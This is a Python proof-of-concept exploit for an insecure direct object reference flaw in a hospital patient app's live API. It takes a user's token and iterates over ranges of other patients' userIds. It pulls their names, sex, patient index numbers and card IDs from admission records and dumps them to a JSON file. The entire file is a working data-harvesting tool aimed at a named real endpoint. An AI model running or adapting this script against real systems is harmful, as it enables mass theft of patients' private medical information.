#!/usr/bin/env python3
"""
HXGY App IDOR Vulnerability PoC
Queries patient medical records via Insecure Direct Object Reference

Usage:
    python hxgy-idor.py --token <jwt_token> --userid <target_userid>
    python hxgy-idor.py --token <jwt_token> --range 279070 279090
"""

import argparse
import json
import requests
from typing import Optional


API_URL = "https://hxgyapiv2.cd120.info/cloud/guidance/admission/queryAdmission"

DEFAULT_HEADERS = {
    "UUID": "25FEFB37-9D3D-4FA1-B7E8-81F7FB0A2FAD",
    "Client-Version": "7.1.1",
    "User-Agent": "hua yi tong/7.1.1 (iPhone; iOS 15.7.1; Scale/3.00)",
    "Content-Type": "application/json",
    "Accept": "*/*",
}


def query_admission(token: str, user_id: str, timeout: int = 10) -> dict:
    """Query admission records for a given userId."""
    headers = {
        **DEFAULT_HEADERS,
        "token": token,
        "accessToken": token,
    }
    
    payload = {
        "appCode": "HXGYAPP",
        "channelCode": "PATIENT_IOS",
        "userId": str(user_id),
    }
    
    response = requests.post(API_URL, headers=headers, json=payload, timeout=timeout)
    return response.json()


def extract_patient_info(data: list) -> list[dict]:
    """Extract relevant patient info from response data."""
    patients = []
    seen = set()
    
    for record in data:
        key = (record.get("userId"), record.get("patientName"))
        if key not in seen:
            seen.add(key)
            patients.append({
                "userId": record.get("userId"),
                "patientName": record.get("patientName"),
                "sex": "Male" if record.get("sex") == 1 else "Female",
                "pmi": record.get("pmi"),
                "pmiNo": record.get("pmiNo"),
                "cardId": record.get("cardId"),
            })
    
    return patients


def test_single(token: str, user_id: str, verbose: bool = False) -> Optional[dict]:
    """Test a single userId for IDOR."""
    try:
        result = query_admission(token, user_id)
        
        if result.get("code") != "1":
            print(f"[!] userId {user_id}: Error - {result.get('msg')}")
            return None
        
        data = result.get("data", [])
        if not data:
            if verbose:
                print(f"[-] userId {user_id}: No records")
            return None
        
        patients = extract_patient_info(data)
        record_count = len(data)
        
        for p in patients:
            print(f"[+] userId {user_id}: {p['patientName']} ({p['sex']}) - {record_count} records")
            if verbose:
                print(f"    PMI: {p['pmi']}, PMI No: {p['pmiNo']}")
                print(f"    Card ID: {p['cardId']}")
        
        return {"userId": user_id, "patients": patients, "records": data}
        
    except requests.exceptions.Timeout:
        print(f"[!] userId {user_id}: Timeout")
        return None
    except Exception as e:
        print(f"[!] userId {user_id}: {e}")
        return None


def test_range(token: str, start: int, end: int, verbose: bool = False) -> list[dict]:
    """Test a range of userIds."""
    results = []
    
    print(f"[*] Testing userId range {start} to {end}")
    print("-" * 60)
    
    for uid in range(start, end + 1):
        result = test_single(token, str(uid), verbose)
        if result:
            results.append(result)
    
    print("-" * 60)
    print(f"[*] Found {len(results)} users with records out of {end - start + 1} tested")
    
    return results


def main():
    parser = argparse.ArgumentParser(
        description="HXGY IDOR Vulnerability PoC",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s --token "eyJ..." --userid 279078
  %(prog)s --token "eyJ..." --range 279070 279090
  %(prog)s --token "eyJ..." --range 279000 280000 --output results.json
        """
    )
    
    parser.add_argument("--token", required=True, help="JWT token (with ***HXGYAPP suffix)")
    parser.add_argument("--userid", help="Single userId to query")
    parser.add_argument("--range", nargs=2, type=int, metavar=("START", "END"),
                        help="Range of userIds to test")
    parser.add_argument("--output", "-o", help="Output file for JSON results")
    parser.add_argument("--verbose", "-v", action="store_true", help="Verbose output")
    
    args = parser.parse_args()
    
    if not args.userid and not args.range:
        parser.error("Either --userid or --range is required")
    
    results = []
    
    if args.userid:
        result = test_single(args.token, args.userid, args.verbose)
        if result:
            results.append(result)
            if args.verbose:
                print(f"\nFull response:\n{json.dumps(result['records'], indent=2, ensure_ascii=False)}")
    
    if args.range:
        results = test_range(args.token, args.range[0], args.range[1], args.verbose)
    
    if args.output and results:
        with open(args.output, "w", encoding="utf-8") as f:
            json.dump(results, f, indent=2, ensure_ascii=False)
        print(f"[*] Results saved to {args.output}")


if __name__ == "__main__":
    main()
